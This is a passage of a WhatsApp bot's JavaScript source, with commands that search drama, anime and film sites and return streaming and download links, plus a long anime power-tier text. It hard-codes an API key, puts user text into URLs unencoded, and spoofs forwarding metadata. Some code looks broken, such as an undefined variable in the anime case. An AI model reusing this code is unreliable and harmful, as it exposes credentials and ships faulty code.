                        display_text: `Streaming ${episode.episode} (${url.provider})`,
                        url: url.url,
                        merchant_url: url.url
                    })
                }));
            });

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: 'Drakor search result',
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Here are your drakor streaming results. Select the episode you want to watch:'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* 👋`,
                                subtitle: "ToxxicTechInc",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            newReply('No episode found');
        }
    } catch (err) {
        console.log(err);
        newReply('error');
    }
 }
break
case 'anime': {   
    if (!text) return newReply(`Example : ${prefix + command} Jujutsu kaisen`);      
    try {
        let res = await fetch(`https://api.neoxr.eu/api/anime?q=${text}&apikey=yC8nWs`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(anime => {
                // Mengubah URL di sini
                let updatedUrl = anime.url.replace('https://animebatch.id', 'https://animebatch.id');
                return {
                    title: anime.title,
                    rows: [
                        {
                            title: 'SEE DETAILS',
                            description: `click to see detail "${anime.title}"`,
                            id: `.detailanime ${updatedUrl}`
                        },
                        {
                            title: 'WATCH NOW',
                            description: `click to watch "${anime.title}"`,
                            id: `.streaminganime ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: 'ANIME RESULT',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
                                forwardingScore: 256,
                                externalAdreplygcLorenzo: {
                                    title: 'ToxxicTechInc',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url.replace('https://animebatch.id', 'https://animebatch.id'), // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* 👋`,
                                subtitle: "ToxxicTechInc",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            newReply('No episode found');
        }
    } catch (err) {
        console.log(err);
        newReply('error');
    }
 }
break
case 'film': {    
    if (!text) return newReply(`Example : ${prefix + command} Criminal`);       
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film?q=${text}&apikey=yC8nWs`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 6).map(film => ({
                title: film.title,
                rows: [
                    {
                        title: 'SEE DETAILS',
                        description: `click to see detail "${film.title}"`,
                        id: `.detailfilm ${film.url}`
                    },
                    {
                        title: 'WATCH NOW',
                        description: `click to watch "${film.title}"`,
                        id: `.streamingfilm ${film.url}`
                    }
                ]
            }));

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '1203633365285781080@newsletter',
                                    newsletterName: 'FILM RESULT',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
                                forwardingScore: 256,
                                externalAdreplygcLorenzo: {
                                    title: 'ToxxicTechInc',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url, // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Hasil_Pencarian",
                                hasMediaAttachment: false//,
                                //...(await prepareWAMessageMedia({ image: { url: json.data[0].thumbnail } }, { upload: ToxxicTechInc.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            newReply('Film not found');
        }
    } catch (error) {
        console.error(error);
        newReply('error');
    }
}
break
case 'detailfilm': {
    if (!text) return newReply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film-get?url=${encodeURIComponent(text)}&apikey=yC8nWs`);
        let result = await res.json();
        
        if (result.status && result.data) {
            let data = result.data;
            let caption = `
Quality: ${data.quality}
Country: ${data.country}
Actors: ${data.actors}
Director: ${data.director}
Genre: ${data.genre}
Rating: ${data.imdb}
Release: ${data.release}
Duration: ${data.duration}
            `.trim();
ToxxicTechInc.sendMessage(m.chat, {
text: caption,
contextInfo: {
mentionedJid: [m.sender],
externalAdreplygcLorenzo: {
title: "Film-Detail",
thumbnailUrl: data.thumbnail,
sourceUrl: `${text}`,
mediaType: 1,
renderLargerThumbnail: true
}}
},{
quoted: m
})
        } else {
            newReply('Film not found');
        }
    } catch (err) {
        console.log(err);
        newReply('error');
    }
}
break
case 'streamingfilm': {
    if (!text) return newReply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/film-get?url=${text}&apikey=yC8nWs`);
        let result = await res.json();
        if (result.status && result.stream.length > 0 && result.download.length > 0) {
            let streamButtons = result.stream.map(stream => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Streaming ${stream.quality}`,
                    url: stream.url,
                    merchant_url: stream.url
                })
            }));
            
            let downloadButtons = result.download.map(download => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Download With ${download.provider}`,
                    url: download.url,
                    merchant_url: download.url
                })
            }));
            
            let allButtons = [...streamButtons, ...downloadButtons];
            
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363336528578108@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Below is the link to watch/stream your movie video, happy watching!'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* 👋`,
                                subtitle: "ToxxicTechInc",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: allButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            newReply('No streaming or download links were found.');
        }
    } catch (err) {
        console.log(err);
        newReply('error');
    }
    }
    break
    case 'anime-tierlist':{
if (!text) return newReply(`Type : *${prefix}${command} < 1 - 10 & Full>*
Example : *${prefix}${command} 11*
`);
	if (args[0]?.toLowerCase() === "11") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「Level 11: Very Small」*
No joule values available. These levels relate to characters who can create/destroy or influence the entire structure of lower dimensional universes, or lower layers/levels of reality. Please note that those that exist as images or are created from data/information cannot be ranked at this level, as the creatures are still 3 dimensional, but on a very small scale.

#11-C: Low Hypoverse Level
Characters who demonstrate power equivalent to destroying/creating a 0-D level construct of any size, or three levels of infinity/fictional degrees of reality/transcendence or similar below 3-D reality. This tier also includes characters who are significantly below this level, and all characters who are significantly below the requirements of this tier will remain in this tier.

#11-B: Hypoverse level
Characters who exhibit power equivalent to destroying/creating existentially lower 1-D level constructs of any size, or two levels of infinity/fictional degrees of reality/transcendence or similar below 3-D reality.

#11-A: High Hypoverse Level
Characters who exhibit power equivalent to destroying/creating existentially lower 2-D level constructs of any size, or 1 infinity/degree of reality/fictional transcendence or similar below 3-D reality.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "10") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「Level 10: Human」*
#10-C: Below Average Human Level
Characters capable of exerting strength comparable to humans are below the average norm in terms of strength, such as small children or weaklings, as well as smaller animals such as cats and dogs.

#10-B: Human level
Characters capable of exerting strength comparable to ordinary humans, such as teenagers or unathletic adults.

#10-A: Athlete level
Characters capable of exerting strength comparable to more athletic humans, such as trained fighters or generally physically fit individuals.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "9") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「Level 9: Superhuman」*
#9-C: Street level
Characters who stand on the threshold of human strength and ability, are represented by Olympic-level athletes or rigorously trained martial artists, as well as larger animals.

It is important to note that, despite being named "Street level", this level has nothing to do with actually affecting an entire street, with the name referring more to street fighters as depicted in martial arts films and the like.

#9-B: Wall level
Characteristics that can destroy or significantly damage highly resistant materials such as stone, metal or steel, as well as similarly resistant construction parts such as masonry and structural walls.

#9-A: Small Building Level
Characters capable of destroying rooms or entire small buildings such as houses or simpler buildings.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "8") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「Level 8: Urban」*
#8-C: Building level
A character who can destroy medium-sized buildings and constructions, such as large factories or large complexes such as supermarkets.

#8-C Height: Large Building Level
A character who can destroy large buildings such as skyscrapers.

#8-B: City Block Level
Characters that can destroy city blocks of cities or equivalent areas of space.

#8-A: Multi-City Block Level
Characters that can destroy several city blocks or equivalent areas of space.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "7") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「 Level 7: Nuclear」*
#Low 7-C: Small Town Level
A character that can destroy a small town or settlement, or that can easily injure a character with small town level durability.

#7-C: City level
Characters that can destroy cities, or that can easily injure characters with city-level durability.

#High 7-C: Large City Level
A character who can destroy a large city, or who can easily injure a character with the durability of a large city level.

#Low 7-B: Small Town Level
A character that can destroy a small town, or who can easily injure a character with small town-level durability.

#7-B: City level
Characters/Weapons that can destroy cities, or that can easily injure characters with city-level durability.

#7-A: Mountain level
Characters/Weapons that can destroy mountains, or that can easily injure characters with mountain-level durability.

#7-A High: Big Mountain Level
A character that can destroy a large mountain, or that can easily injure a character with the durability of a large mountain level.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "6") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「 Level 6: Tectonic」*
#6-C: Island level
Characters/Weapons that can destroy islands, or that can easily injure characters with island-level durability.

#High 6-C: Large Island Level
Characters that can destroy large islands, or that can easily injure characters with large island-level durability.

#Low 6-B: Small Country Level
A character who can destroy a small country, or who can easily injure a character with small country-level durability.

#6-B: Country level
Characters that can destroy countries, or that can easily injure characters with country-level durability.

#High 6-B: Large Country Level
A character who can destroy a large country, or who can easily injure a character with large country-level endurance.

#6-A: Continent level
A character who can destroy continents or who can do no harm to characters with continent-level endurance.

#High 6-A: Multi-Continent Level
A character who can destroy multiple continents or who can easily harm a character with multi-continent level endurance.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "5") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「 Level 5: Planet」*
#5-C: Moon level
A character that can destroy the moon, or an astrological object of the same proportion.

#Low 5-B: Small Planet Level 
Characters that can destroy minor planets or that can easily injure characters with minor planet-level durability.

#5-B: Planetary level
Characters that can create/destroy planets.

#5-A: Large Planet Level
Characters that can create/destroy large gas giants such as Jupiter and Saturn.

#High 5-A: Dwarf Star Level
Characters that can create/destroy very small stars.`
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "4") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「 Level 4: Stellar」*
#Low 4-C: Small Star Tier
Characters that can create/destroy small stars.

#4-C: Stellar level
Characters that can create/destroy stars.

#High 4-C: Big Star Level
Characters that can create/destroy big stars.

#4-B: Solar System Level
Characters that can create/destroy solar systems.

#4-A: Multi-Solar System Level
A character that can create/destroy multiple solar systems.`,
			},
			{ quoted: m },
		);
			} else if (args[0]?.toLowerCase() === "3") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「 Level 3: Cosmic」*
#3-C: Galactic level
A character capable of creating and/or destroying galaxies, if the space between celestial bodies is taken into account, not just the matter they encompass.

#3-B: Multi-Galaxy level
A character capable of creating and/or destroying multiple galaxies if the space between celestial bodies is also taken into account.

#3-A: Universe level
A character who can significantly influence, create and/or destroy a universe at least as large as our own size, but not much larger.

#High 3-A: High Universe Level
Characters who demonstrate an infinite amount of energy on a 3-D scale, or those who can affect an infinite 3-D area or an infinite number of finite or infinite universes while not accounting for higher dimensions or time, or more generally any realm of comparable size. A large number of infinite universes, unless causally mutually enclosed by spacetime or separate existence, only counts for levels higher than these levels. Being "infinite" stronger than this level, unless uncountable, does not qualify for a higher level.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "2") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*「 Level 2: Multiversal」*
Low 2-C | Universe level +: A character capable of significantly influencing, creating and/or destroying areas of space that are qualitatively larger than an infinitely sized 3-dimensional space. A common fictional space-time example that represents such a size is the space-time continuum on a universal scale. However, this can be more generally fulfilled by any 4-dimensional space that:

A.) Equivalent to an extra-large dimensional space. That is, a higher-dimensional "bulk" space that embeds lower-dimensional spaces (such as our universe) as subsets of itself, whose dimensions are not microscopic/compressed.

B.) Described as lower-dimensional objects and spaces that completely transcend the setting in the setting of a work of fiction.

#2-C | Low Multiverse Level: Characters who can significantly influence, create and/or destroy a small multiverse that can consist of several separate space-time continuums ranging from two to a thousand, or equivalent.

#2-B: Multiverse level
Characters who can significantly influence [1], create and/or destroy a larger multiverse consisting of 1001 to a higher finite number of separate space-time continuums.

#2-A: Multiverse level +
A character who is able to significantly influence, create and/or destroy countless space-time continuums.`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "1") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「 Level 1: Extradimensionality」*
A character who can significantly affect a space of qualitatively larger size than ordinary universal models and spaces, usually represented in fiction by a higher level or state of existence (Or "level of infinity") that trivializes everything below it into insignificance, usually by considering it similar to a fictional construct or something very small.

#Low 1-C | Low Complex Multiverse Level: A character that can affect, create, and/or destroy an entire space whose size corresponds to one to two infinite levels higher than the standard universal model (low 2-C structure, in plain English.) "dimensional" scale, this can be equated to a real coordinate space of 5 and 6 dimensions (R^5 to R^6)

#1-C | Complex Multiverse Level: A character who can affect, create, and/or destroy space whose size corresponds to three to five infinitely higher levels greater than the standard universal model. In "dimensional" scale, this can be equated to 7 and 9 dimensional real coordinate space (R^7 to R^9)

#High 1-C | High Complex Multiverse Level: A character who can universally influence, create, and/or destroy space whose size corresponds to six to seven infinite levels higher than the standard universal model. In "dimensional" scale, this can be equated to 10- and 11-dimensional real coordinate space (R^10 to R^11)

#1-B | Hyperverse Level: Characters that can universally affect, create and/or destroy spaces that are the appropriate size from 8 to infinitely higher levels above the standard universal model. In terms of "dimensional" size, this can be equated to real coordinate space 12 dimensions and above (R^12 and above)

#High 1-B | High Hyperverse Level: Characters that can universally influence, create and/or destroy structures that are equivalent in size to countless qualitative measures above the universal model, usually represented in fiction by an endless hierarchy of layers of existence, each replacing a completely trivialized previous one into insignificance, or more generally a space with countless infinite dimensions.

#1-A: Outer Tier
Characters that functionally transcend the rest of the Tiering system, and stand outside of hierarchical extension and infinite size, to varying degrees and magnitudes. In simpler terms, this category can be said to be occupied by characters whose size and/or power levels cannot be achieved simply by stacking greater infinities on top of each other.

#Low 1-A | Low Outerverse: Characters that can universally affect, create and/or destroy countless infinite-dimensional structures and expanses, or that have a size roughly analogous to them, such as an infinite set of hierarchical layers or planes of existence, especially those whose number of layers is proportional to the set of all real numbers, and thus equated to the first uncountable cardinal of infinity, ℵ1, for the sake of simplicity.

Alternatively, this level can also be assigned to characters that transcend the 1-High-B structure when no further context regarding the nature of such transcendence is given.

#1-A Outerverse: A character who can significantly affect, create and/or destroy realms or states of being that completely transcend infinitely layered hierarchies and/or dimensional levels on a conceptual or existential level, usually described as a completely external abstraction that is beyond the application of spatiotemporal dimensionality as a constant defined by physics on any level, even compared to infinite or infinitely infinite dimensions, usually by considering it akin to fiction or something similarly insignificant.

Note, however, that a character can qualify for this rank even if the verse does not have infinite layers or an equivalent cosmology, as long as it is stated, shown, or left very clear that the character is past the nature of such structures as a whole, in a way that simply "piling on" more of them would logically not allow one to reach the level of their power/size.

Mathematically, 1-A has its size represented by a countably infinite cardinal beyond any useful application of a given size (ℵ2 and beyond, most specifically) and can be extended to greater levels of infinity, representing different complexities or qualitative "steps" on the Outerversal scale, in the same way 1-B and 1-C are divided. Characters that stand an infinite number of steps above the Outerversal "Baseline" realm and structure must have a + modifier in their Attack Potency section (Outerversal + level)

#High 1-A | High Outerverse: Characters that can affect and create/destroy states or realms that completely transcend the infinitely layered Outerversal hierarchy and any extensions thereof, as well as the framework in which those entities are defined in the first place. Note that adding more "layers" to the already infinite 1-A hierarchy (or some structure of equivalent size) is not enough to reach this level, and one must be completely external and unreachable by it in any form`,
			},
			{ quoted: m },
		);
			} else if (args[0]?.toLowerCase() === "0") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
text: `*「 Level 0: Boundless」*
#0 | Boundless: A character who demonstrates equality with, or can create/destroy/influence, a transcendental abstract level of existence that is conceptually superior to even High 1-A levels. Being "omnipotent" or similar reasons are hardly enough to reach this level; characters at this level must surpass High 1-A characters because High 1-A characters will surpass 1-A characters. This level has no true endpoint, and can be extended to higher levels, spiraling upwards indefinitely.`
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "full") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
			text: `*Tiering Anime ࿐໋*

*[≽️ Tier 11: Very Small*
No joule value available. This tier pertains to characters who can create/destroy or affect the entire structure of a lower dimensional universe, or lower layers/levels of reality. Please note that those that exist as images or are created from data/information cannot be ranked at this tier, as such beings are still 3-dimensional, but on a very small scale.

#11-C: Low Hypoverse Tier
Characters who demonstrate powers equivalent to destroying/creating 0-D level constructs of any size, or three levels of infinity/degrees of reality/fictional transcendence or similar below 3-D reality. This tier also includes characters who fall significantly below this level, and all characters who fall significantly below the requirements of this tier will remain in this tier.

#11-B: Hypoverse level
Characters who exhibit powers equivalent to destroying/creating existentially inferior 1-D level constructs of any size, or two levels of infinity/degrees of reality/fictional transcendence or similar below 3-D reality.

#11-A: High Hypoverse Level
A character that exhibits power equivalent to destroying/creating an existentially inferior 2-D level construct of any size, or 1 level of infinity/degree of reality/fictional transcendence or similar under 3-D reality.


*[≽️ Level 10: Human*
#10-C: Below Average Human Level
Characters capable of exerting strength comparable to humans who are below the average norm in terms of strength, such as small children or weak people, as well as smaller animals such as cats and dogs.

#10-B: Human level
Characters capable of exerting strength comparable to that of ordinary humans, such as teenagers or non-athletic adults.

#10-A: Athlete level
Characters capable of exerting strength comparable to more athletic humans, such as trained fighters or generally physically fit individuals.


*[≽️ Level 9: Superhuman*
#9-C: Street Level
Characters who stand on the brink of human strength and ability, represented by Olympic-level athletes or rigorously trained martial artists, as well as larger animals.

It is important to note that, despite the name "Street level", this level has nothing to do with actually affecting the entire street, with the name referring more to street fighters as depicted in martial arts movies and the like.

#9-B: Wall level
A character that can destroy or significantly damage highly resistant materials such as stone, metal or steel, as well as similarly resistant construction parts such as masonry and structural walls.

#9-A: Small Building Level
Characters capable of destroying rooms or entire small buildings such as houses or simpler buildings.

*[≽️ Tier 8: Urban*
#8-C: Building level
Characters that can destroy medium-sized buildings and constructions, such as large factories or large complexes like supermarkets.

#8-C: Large Building Level
Characters that can destroy large buildings such as skyscrapers.

#8-B: City Block Level
Characters that can destroy city city blocks or equivalent areas of space.

#8-A: Multi-City Block Level
A character that can destroy multiple city blocks or equivalent areas of space.


*[≽️Low 7: Nuclear*
#Low 7-C: Small Town Level
Characters that can destroy a small town or settlement, or that can easily injure characters with small town level durability.

#7-C: City level
Characters that can destroy cities, or that can easily injure characters with city-level durability.

#High 7-C: Large City Level
A character who can destroy a large city, or who can easily injure a character with the durability of a large city level.

#Low 7-B: Small Town Level
A character that can destroy a small town, or who can easily injure a character with small town-level durability.

#7-B: City level
Characters/Weapons that can destroy cities, or that can easily injure characters with city-level durability.

#7-A: Mountain level
Characters/Weapons that can destroy mountains, or that can easily injure characters with mountain-level durability.

#7-A High: Big Mountain Level
Characters that can destroy large mountains, or that can easily injure characters with large mountain level durability.


*[≽️ Level 6: Tectonic*
#6-C: Island level
Characters/Weapons that can destroy islands, or that can easily injure characters with island-level durability.

#High 6-C: Large Island Level
Characters that can destroy large islands, or that can easily injure characters with large island-level durability.

#Low 6-B: Small Country Level
A character who can destroy a small country, or who can easily injure a character with small country-level durability.

#6-B: Country level
Characters that can destroy countries, or that can easily injure characters with country-level durability.

#High 6-B: Large Country Level
A character who can destroy a large country, or who can easily injure a character with large country-level endurance.

#6-A: Continent level
A character who can destroy continents or who can do no harm to characters with continent-level endurance.

#High 6-A: Multi-Continent Level
Characters that can destroy multiple continents or that can easily harm characters with multi-continent level durability.


*[≽️ Level 5: Planet*
#5-C: Moon level
A character that can destroy the moon, or an astrological object of the same proportion.

#Low 5-B: Minor Planet Level 
Characters that can destroy minor planets or that can easily injure characters with minor planet-level durability.

#5-B: Planetary level
Characters that can create/destroy planets.

#5-A: Large Planet Level
Characters that can create/destroy large gas giants such as Jupiter and Saturn.

#High 5-A: Dwarf Star Level
Characters that can create/destroy very small stars.

*[≽️ Tier 4: Stellar*
#Low 4-C: Small Star Tier
Characters that can create/destroy small stars.

#4-C: Stellar level
Characters that can create/destroy stars.

#High 4-C: Big Star Level
Characters that can create/destroy big stars.

#4-B: Solar System Level
Characters that can create/destroy solar systems.

#4-A: Multi-Solar System Level
Characters who can create/destroy multiple solar systems.

*[≽️ Tier 3: Cosmic*
#3-C: Galactic Level
A character who is able to create and/or destroy galaxies, if the space between celestial bodies is taken into account, not just the matter they encompass.

#3-B: Multi-Galaxy level
A character capable of creating and/or destroying multiple galaxies if the space between celestial bodies is also taken into account.

#3-A: Universe level
A character who can significantly influence, create and/or destroy a universe at least as large as our own size, but not much larger.

#High 3-A: High Universe Level
Characters who demonstrate an infinite amount of energy on a 3-D scale, or those who can affect an infinite 3-D area or an infinite number of finite or infinite universes while not accounting for higher dimensions or time, or more generally any realm of comparable size. An infinite number of universes, unless causally mutually enclosed by spacetime or separate existence, only counts for a level higher than this level. Being "infinite" stronger than this level, unless uncountable, does not qualify for a higher level.


*[≽️ Level 2: Multiversal*
Low 2-C | Universe + level: Characters capable of significantly influencing, creating and/or destroying areas of space that are qualitatively larger than an infinitely sized 3-dimensional space. A common fictional space-time example that represents such a size is the space-time continuum on a universal scale. However, this can be more generally fulfilled by any 4-dimensional space that:

A.) Equivalent to an extra-large dimensional space. That is, a higher-dimensional "bulk" space that embeds lower-dimensional spaces (such as our universe) as subsets of itself, whose dimensions are not microscopic/compressed.

B.) Described as lower-dimensional objects and spaces that completely transcend the setting in the setting of a work of fiction.

#2-C | Low Multiverse Level: Characters who can significantly influence, create and/or destroy a small multiverse that can consist of several separate space-time continuums ranging from two to a thousand, or equivalent.

#2-B: Multiverse level
Characters who can significantly influence [1], create and/or destroy a larger multiverse consisting of 1001 to a higher finite number of separate space-time continuums.

#2-A: Multiverse level +
A character who is able to significantly influence, create and/or destroy countless space-time continuums.

*[≽️ Level 1: Extradimensional*
A character who can significantly affect a space of qualitatively greater size than ordinary universal models and spaces, usually represented in fiction by a higher level or state of existence (Or "level of infinity") that trivializes everything below it into insignificance, usually by considering it akin to a fictional construct or something very small.

#Low 1-C | Low Complex Multiverse Level: A character that can affect, create, and/or destroy an entire space whose size corresponds to one to two infinite levels higher than the standard universal model (low 2-C structure, in plain English.) "dimensional" scale, this can be equated to a real coordinate space of 5 and 6 dimensions (R^5 to R^6)

#1-C | Complex Multiverse Level: A character who can affect, create, and/or destroy space whose size corresponds to three to five infinitely higher levels greater than the standard universal model. In "dimensional" scale, this can be equated to 7 and 9 dimensional real coordinate space (R^7 to R^9)

#High 1-C | High Complex Multiverse Level: A character who can universally influence, create, and/or destroy space whose size corresponds to six to seven infinite levels higher than the standard universal model. In "dimensional" scale, this can be equated to 10- and 11-dimensional real coordinate space (R^10 to R^11)

#1-B | Hyperverse Level: Characters that can universally affect, create and/or destroy spaces that are the appropriate size from 8 to infinitely higher levels above the standard universal model. In terms of "dimensional" size, this can be equated to real coordinate space 12 dimensions and above (R^12 and above)

#High 1-B | High Hyperverse Level: Characters who can universally influence, create and/or destroy structures that are equivalent in size to countless qualitative measures above the universal model, usually represented in fiction by an endless hierarchy of layers of existence, each replacing a completely trivialized previous one into insignificance, or more generally a space with countless infinite dimensions.

#1-A: Outer Tier
Characters that functionally transcend the rest of the Tiering system, and stand outside of hierarchical extension and infinite size, to varying degrees and magnitudes. In simpler terms, this category can be said to be occupied by characters whose size and/or power levels cannot be achieved simply by stacking greater infinities on top of each other.

#Low 1-A | Low Outerverse: Characters that can universally affect, create and/or destroy countless infinite-dimensional structures and expanses, or that have a size roughly analogous to them, such as an infinite set of hierarchical layers or planes of existence, especially those whose number of layers is proportional to the set of all real numbers, and thus equated to the first uncountable cardinal of infinity, ℵ1, for the sake of simplicity.

Alternatively, this level can also be assigned to characters that transcend the 1-High-B structure when no further context regarding the nature of such transcendence is given.

#1-A Outerverse: A character who can significantly affect, create and/or destroy realms or states of being that completely transcend infinitely layered hierarchies and/or dimensional levels on a conceptual or existential level, usually described as a completely external abstraction that is beyond the application of spatiotemporal dimensionality as a constant defined by physics on any level, even compared to infinite or infinitely infinite dimensions, usually by considering it akin to fiction or something similarly insignificant.

Note, however, that a character can qualify for this rank even if the verse does not have infinite layers or an equivalent cosmology, as long as it is stated, displayed, or left very clear that the character is past the nature of such structures as a whole, in a way that simply "piling on" more of them would logically not allow one to reach the level of its power/size.

Mathematically, 1-A has its size represented by a countably infinite cardinal beyond any useful application of a given size (ℵ2 and beyond, most specifically) and can be extended to greater levels of infinity, representing different complexities or qualitative "steps" on the Outerversal scale, in the same way 1-B and 1-C are divided. Characters that stand an infinite number of steps above the Outerversal "Baseline" realm and structure must have a + modifier in their Attack Potency section (Outerversal + level)

#High 1-A | High Outerverse: Characters that can affect and create/destroy states or realms that completely transcend the infinitely layered Outerversal hierarchy and any extensions thereof, as well as the framework in which those entities are defined in the first place. Note that adding more "layers" to the already infinite 1-A hierarchy (or some structure of equivalent size) is not enough to reach this level, and one must be completely external and unreachable by it in any form.

*[≽️ Level 0: Boundless*
#0 | Boundless: A character who demonstrates equality with, or can create/destroy/influence, a transcendental abstract level of existence that is conceptually superior to even High 1-A level. Being "omnipotent" or similar reasons are hardly enough to reach this level; characters at this level must surpass High 1-A characters because High 1-A characters will surpass 1-A characters. This level has no true endpoint, and can be extended to higher levels, spiraling upwards indefinitely.',`
			},
			{ quoted: m },
		);
	}
};
break
            case 'valorant-maps': {
    if (!text) return newReply(`Example ${prefix + command} Ascent`);
    try {
        let response = await fetch('https://valorant-api.com/v1/maps');
        let data = await response.json();
        let maps = data.data;
        let map = maps.find(map => map.displayName.toLowerCase() === text.toLowerCase());

        if (!map) return newReply(`Map dengan nama ${text} tidak ditemukan`);

        let caption = `
UUID: ${map.uuid || 'N/A'}
Name: ${map.displayName || 'N/A'}
Tactical Description: ${map.tacticalDescription || 'N/A'}
Coordinates: ${map.coordinates || 'N/A'}
        `;

